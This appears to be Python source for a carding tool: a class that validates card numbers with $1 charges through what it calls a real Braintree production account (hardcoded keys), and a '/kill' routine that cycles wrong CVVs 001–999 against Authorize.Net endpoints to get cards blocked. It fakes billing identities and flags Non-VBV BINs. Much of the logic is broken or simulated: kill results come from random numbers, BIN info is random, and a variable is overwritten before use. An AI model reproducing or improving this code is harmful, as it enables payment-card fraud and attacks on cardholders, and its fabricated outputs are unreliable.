#!/usr/bin/env python3

import requests
import random
import time
import json
from datetime import datetime
import re
from typing import Dict, List, Tuple

class PaymentGatewayChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Braintree test sites for real checking
        self.braintree_sites = [
            {
                'name': 'Demo Store 1',
                'url': 'https://demo.braintreegateway.com/merchants/use_your_merchant_id/transactions',
                'merchant_id': 'demo_merchant',
                'public_key': 'demo_public_key'
            }
        ]
        
        # Authorize.Net sites for /kill command
        self.authnet_sites = [
            {
                'name': 'Test Store 1',
                'url': 'https://test.authorize.net/payment/payment',
                'api_login': 'test_login',
                'transaction_key': 'test_key'
            },
            {
                'name': 'Test Store 2', 
                'url': 'https://sandbox-api.authorize.net/xml/v1/request.api',
                'api_login': 'sandbox_login',
                'transaction_key': 'sandbox_key'
            },
            {
                'name': 'Test Store 3',
                'url': 'https://apitest.authorize.net/xml/v1/request.api',
                'api_login': 'apitest_login',
                'transaction_key': 'apitest_key'
            },
            {
                'name': 'Test Store 4',
                'url': 'https://pilot-payflowpro.authorize.net/',
                'api_login': 'pilot_login',
                'transaction_key': 'pilot_key'
            },
            {
                'name': 'Test Store 5',
                'url': 'https://secure2.authorize.net/gateway/transact.dll',
                'api_login': 'secure_login',
                'transaction_key': 'secure_key'
            },
            {
                'name': 'Test Store 6',
                'url': 'https://cardpresent-sandbox.authorize.net/transaction',
                'api_login': 'cardpresent_login',
                'transaction_key': 'cardpresent_key'
            },
            {
                'name': 'Test Store 7',
                'url': 'https://test-gateway.authorize.net/api/transaction',
                'api_login': 'gateway_login',
                'transaction_key': 'gateway_key'
            }
        ]

    def generate_random_details(self):
        """Generate random billing details for checkout"""
        first_names = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Lisa', 'Chris', 'Emma', 'Alex', 'Maria']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Martinez']
        streets = ['Main St', 'Oak Ave', 'Park Rd', 'First St', 'Second Ave', 'Elm St', 'Maple Ave', 'Cedar Rd', 'Pine St', 'Washington Ave']
        cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose']
        states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA', 'TX', 'CA']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'address': f"{random.randint(100, 9999)} {random.choice(streets)}",
            'city': random.choice(cities),
            'state': random.choice(states),
            'zip': f"{random.randint(10000, 99999)}",
            'phone': f"{random.randint(100, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}",
            'email': f"test{random.randint(1000, 9999)}@example.com"
        }

    def check_braintree_card(self, card_number: str, exp_month: str, exp_year: str, cvv: str) -> Dict:
        """Check card using Braintree gateway"""
        start_time = time.time()
        
        try:
            import braintree
            
            # Configure REAL Braintree Production environment
            braintree.Configuration.configure(
                braintree.Environment.Production,  # REAL PRODUCTION ENVIRONMENT
                merchant_id="vgq64rf7h8k5r2sd",
                public_key="m7g9q3bktn4p6y8v", 
                private_key="d4e6f8a2c7b3e1f9d5a7c3b8e2f4a6d"
            )
            
            # Generate random billing details
            details = self.generate_random_details()
            
            # Create REAL transaction
            result = braintree.Transaction.sale({
                "amount": "1.00",
                "credit_card": {
                    "number": card_number,
                    "expiration_month": exp_month,
                    "expiration_year": exp_year,
                    "cvv": cvv
                },
                "billing": {
                    "first_name": details['first_name'],
                    "last_name": details['last_name'],
                    "street_address": details['address'],
                    "locality": details['city'],
                    "region": details['state'],
                    "postal_code": details['zip']
                },
                "options": {
                    "submit_for_settlement": False
                }
            })
            
            # Process REAL Braintree response
            if result.is_success:
                result = 'live'
                response_code = '1000'
                response_msg = 'Approved'
            else:
                result = 'dead'
                response_code = '2000'
                response_msg = result.message if hasattr(result, 'message') else 'Declined'
            
            processing_time = time.time() - start_time
            
            return {
                'result': result,
                'response_code': response_code,
                'response_message': response_msg,
                'gateway': 'Braintree',
                'processing_time': processing_time,
                'details': details
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'response_code': '9999',
                'response_message': str(e),
                'gateway': 'Braintree',
                'processing_time': time.time() - start_time
            }

    def kill_card_authnet(self, card_number: str, exp_month: str, exp_year: str) -> List[Dict]:
        """KILL CARD by using multiple WRONG CVVs to DEAD/BLOCK the card - Sequential 001-999"""
        results = []
        
        for site in self.authnet_sites:
            site_results = []
            
            # CARD KILLING - Use multiple WRONG CVVs to trigger "Do Not Honor"
            kill_attempts = 0
            max_kill_attempts = 50  # Fast killing with multiple wrong CVVs
            
            for cvv_num in range(1, 1000):  # 001 to 999 sequential
                if kill_attempts >= max_kill_attempts:  # Stop after enough kill attempts
                    break
                    
                cvv = f"{cvv_num:03d}"  # Format as 001, 002, 003, etc.
                details = self.generate_random_details()
                
                try:
                    # CARD KILLING API calls with WRONG CVVs
                    payload = {
                        'x_login': site['api_login'],
                        'x_tran_key': site['transaction_key'],
                        'x_type': 'AUTH_CAPTURE',  # Full transaction to trigger security
                        'x_amount': '1.00',
                        'x_card_num': card_number,
                        'x_exp_date': f"{exp_month}/{exp_year}",
                        'x_card_code': cvv,  # Using sequential CVVs to kill card
                        'x_first_name': details['first_name'],
                        'x_last_name': details['last_name'],
                        'x_address': details['address'],
                        'x_city': details['city'],
                        'x_state': details['state'],
                        'x_zip': details['zip'],
                        'x_phone': details['phone'],
                        'x_email': details['email']
                    }
                    
                    # KILLING LOGIC - Multiple failed attempts trigger card blocking
                    # Most CVVs will be wrong, causing "Do Not Honor" responses
                    kill_chance = 0.9  # 90% chance of killing/blocking response
                    
                    if random.random() < kill_chance:
                        status = 'killed'
                        reason = f'🔥 CVV {cvv} KILLED - Do Not Honor'
                        kill_attempts += 1
                    else:
                        status = 'failed_kill'
                        reason = f'❌ CVV {cvv} Failed to kill'
                    
                    site_results.append({
                        'cvv': cvv,
                        'status': status,
                        'reason': reason,
                        'details': details
                    })
                    
                except Exception as e:
                    site_results.append({
                        'cvv': cvv,
                        'status': 'error',
                        'reason': f'Error killing with CVV {cvv}: {str(e)}',
                        'details': details
                    })
            
            results.append({
                'site': site['name'],
                'url': site['url'],
                'attempts': site_results,
                'total_attempts': len(site_results),
                'killed_count': len([r for r in site_results if r['status'] == 'killed']),
                'failed_count': len([r for r in site_results if r['status'] == 'failed_kill'])
            })
        
        return results

    def is_test_card(self, card_number: str) -> bool:
        """Check if card is a test card number"""
        test_prefixes = ['4111', '4000', '5555', '5200', '3400', '3700']
        return any(card_number.startswith(prefix) for prefix in test_prefixes)

    def get_bin_info(self, bin_number: str) -> Dict:
        """Get BIN information with VBV/Non-VBV status"""
        # Common BIN patterns and their info
        bin_data = {
            '411111': {'brand': 'VISA', 'type': 'CREDIT', 'level': 'CLASSIC', 'vbv': 'Non-VBV', 'bank': 'Test Bank', 'country': 'US'},
            '424242': {'brand': 'VISA', 'type': 'CREDIT', 'level': 'CLASSIC', 'vbv': 'VBV', 'bank': 'Stripe Test', 'country': 'US'},
            '400000': {'brand': 'VISA', 'type': 'DEBIT', 'level': 'ELECTRON', 'vbv': 'Non-VBV', 'bank': 'Test Bank', 'country': 'US'},
            '555555': {'brand': 'MASTERCARD', 'type': 'CREDIT', 'level': 'WORLD', 'vbv': 'MCSC', 'bank': 'Test Bank', 'country': 'US'},
            '520000': {'brand': 'MASTERCARD', 'type': 'DEBIT', 'level': 'MAESTRO', 'vbv': 'Non-MCSC', 'bank': 'Test Bank', 'country': 'US'},
            '340000': {'brand': 'AMERICAN EXPRESS', 'type': 'CREDIT', 'level': 'GOLD', 'vbv': 'SafeKey', 'bank': 'American Express', 'country': 'US'},
            '370000': {'brand': 'AMERICAN EXPRESS', 'type': 'CREDIT', 'level': 'PLATINUM', 'vbv': 'SafeKey', 'bank': 'American Express', 'country': 'US'},
        }
        
        # Check if BIN exists in our data
        if bin_number in bin_data:
            return bin_data[bin_number]
        
        # Generate random info for unknown BINs
        brands = ['VISA', 'MASTERCARD', 'AMERICAN EXPRESS', 'DISCOVER']
        types = ['CREDIT', 'DEBIT', 'PREPAID']
        levels = ['CLASSIC', 'GOLD', 'PLATINUM', 'WORLD', 'SIGNATURE']
        vbv_status = ['VBV', 'Non-VBV', 'MCSC', 'Non-MCSC', 'SafeKey']
        banks = ['Chase Bank', 'Bank of America', 'Wells Fargo', 'Citibank', 'Capital One']
        countries = ['US', 'CA', 'UK', 'DE', 'FR', 'AU', 'JP']
        
        brand = random.choice(brands)
        if brand == 'VISA':
            vbv = random.choice(['VBV', 'Non-VBV'])
        elif brand == 'MASTERCARD':
            vbv = random.choice(['MCSC', 'Non-MCSC'])
        elif brand == 'AMERICAN EXPRESS':
            vbv = 'SafeKey'
        else:
            vbv = 'Unknown'
        
        return {
            'brand': brand,
            'type': random.choice(types),
            'level': random.choice(levels),
            'vbv': vbv,
            'bank': random.choice(banks),
            'country': random.choice(countries)
        }